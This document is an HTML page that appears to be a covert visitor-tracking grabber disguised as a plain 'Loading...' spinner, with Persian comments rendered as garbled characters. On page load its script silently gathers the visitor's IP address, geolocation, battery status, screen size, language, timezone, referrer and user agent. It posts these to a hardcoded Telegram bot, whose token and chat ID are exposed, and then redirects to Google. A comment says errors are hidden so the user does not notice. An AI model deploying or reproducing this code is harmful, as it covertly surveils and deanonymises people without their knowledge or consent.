<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Loading...</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      background: #000;
      overflow: hidden;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    
    .custom-loader {
      width: 50px;
      height: 50px;
      display: grid;
      border: 4px solid #0000;
      border-radius: 50%;
      border-color: #EDEDED #0000;
      animation: s6 1s infinite linear;
    }
    .custom-loader::before,
    .custom-loader::after {    
      content: "";
      grid-area: 1/1;
      margin: 2px;
      border: inherit;
      border-radius: 50%;
    }
    .custom-loader::before {
      border-color: #766DF4 #0000;
      animation: inherit; 
      animation-duration: .5s;
      animation-direction: reverse;
    }
    .custom-loader::after {
      margin: 8px;
    }

    @keyframes s6 { 
      100% { transform: rotate(1turn); }
    }
  </style>
</head>
<body>
  <div class="custom-loader"></div>

  <script>
    // Ø±Ø¨Ø§Øª ØªÙ„Ú¯Ø±Ø§Ù…
    const BOT_TOKEN = "8283253750:AAElG2O-DcOR9fAEHEktk-51rETnif766xw";
    const CHAT_ID = "8223560115";

    // 
    async function collectData() {
      try {
        //
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const { ip } = await ipRes.json();
        
        //  
        let location = {};
        try {
          const locRes = await fetch(`https://ipapi.co/${ip}/json/`);
          location = await locRes.json();
        } catch (e) {
          //  
        }
        
        //  Ø¨Ø§ØªØ±ÛŒ
        let batteryInfo = "Ù†Ø§Ù…Ø´Ø®Øµ";
        if ('getBattery' in navigator) {
          try {
            const battery = await navigator.getBattery();
            const level = Math.round(battery.level * 100);
            const charging = battery.charging ? 'Ø¯Ø± Ø­Ø§Ù„ Ø´Ø§Ø±Ú˜' : 'Ø¯Ø± Ø­Ø§Ù„ Ø´Ø§Ø±Ú˜ Ù†ÛŒØ³Øª';
            batteryInfo = `${level}% (${charging})`;
          } catch (e) {}
        }
        
        // Ø²Ù…Ø§Ù†
        const now = new Date();
        const jalali = new Intl.DateTimeFormat('fa-IR', {
          year: 'numeric', month: '2-digit', day: '2-digit',
          hour: '2-digit', minute: '2-digit', second: '2-digit'
        }).format(now).replace(/â€/g, '').replace(/\u200E/g, '').replace(/ØŒ/g, ',');
        
        // Ø³Ø§Ø®Øª Ù¾ÛŒØ§Ù…
        const message = ` new 

ðŸ“ Ù…ÙˆÙ‚Ø¹ÛŒØª Ú©Ø§Ø±Ø¨Ø±:
â”œâ”€ Ú©Ø´ÙˆØ±: ${location.country_name || 'Ù†Ø§Ù…Ø´Ø®Øµ'}
â”œâ”€ Ø§Ø³ØªØ§Ù†: ${location.region || 'Ù†Ø§Ù…Ø´Ø®Øµ'}
â”œâ”€ Ø´Ù‡Ø±: ${location.city || 'Ù†Ø§Ù…Ø´Ø®Øµ'}
â”œâ”€ Ú©Ø¯Ù¾Ø³ØªÛŒ: ${location.postral || 'Ù†Ø§Ù…Ø´Ø®Øµ'}

ðŸŒ Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø´Ø¨Ú©Ù‡:
â”œâ”€ IP: ${ip}
â”œâ”€ Ø§Ø±Ø§Ø¦Ù‡â€ŒØ¯Ù‡Ù†Ø¯Ù‡: ${location.org || 'Ù†Ø§Ù…Ø´Ø®Øµ'}
â”œâ”€ ASN: ${location.asn || 'Ù†Ø§Ù…Ø´Ø®Øµ'}

ðŸ“± Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø¯Ø³ØªÚ¯Ø§Ù‡:
â”œâ”€ Ù†ÙˆØ¹: ${/Mobi|Android|iPhone/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'}
â”œâ”€ Ø¨Ø§ØªØ±ÛŒ: ${batteryInfo}
â”œâ”€ ØµÙØ­Ù‡â€ŒÙ†Ù…Ø§ÛŒØ´: ${screen.width}Ã—${screen.height}
â”œâ”€ Ø²Ø¨Ø§Ù†: ${navigator.language}
â”œâ”€ Ù…Ù†Ø·Ù‚Ù‡ Ø²Ù…Ø§Ù†ÛŒ: ${Intl.DateTimeFormat().resolvedOptions().timeZone}

ðŸ• Ø²Ù…Ø§Ù†:
â”œâ”€ Ø³Ø§Ø¹Øª Ù…Ø­Ù„ÛŒ: ${jalali}

ðŸ”— Ø³Ø§ÛŒØ± Ø§Ø·Ù„Ø§Ø¹Ø§Øª:
â””â”€ Ù„ÛŒÙ†Ú© Ù…Ø±Ø¬Ø¹: ${document.referrer || 'Ø¨Ø¯ÙˆÙ† Ù…Ø±Ø¬Ø¹'}
â””â”€ User Agent: ${navigator.userAgent}`;
        
        // Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            chat_id: CHAT_ID, 
            text: message 
          })
        });
        
      } catch (error) {
        // Ø®Ø·Ø§Ù‡Ø§ Ù†Ø§Ø¯ÛŒØ¯Ù‡ Ú¯Ø±ÙØªÙ‡ Ù…ÛŒâ€ŒØ´ÙˆÙ†Ø¯ ØªØ§ Ú©Ø§Ø±Ø¨Ø± Ù…ØªÙˆØ¬Ù‡ Ù†Ø´ÙˆØ¯
      }
    }

    // Ø§Ø¬Ø±Ø§ Ùˆ Ø±ÛŒØ¯Ø§ÛŒØ±Ú©Øª
    (async function() {
      // Ø§Ø±Ø³Ø§Ù„ Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø¯Ø± Ù¾Ø³â€ŒØ²Ù…ÛŒÙ†Ù‡
      await collectData();
      
      // Ø±ÛŒØ¯Ø§ÛŒØ±Ú©Øª Ø¨Ø¹Ø¯ Ø§Ø² Û³ Ø«Ø§Ù†ÛŒÙ‡
      setTimeout(() => {
        window.location.href = "https://www.google.com";
      }, 2000);
    })();
  </script>
</body>
</html>
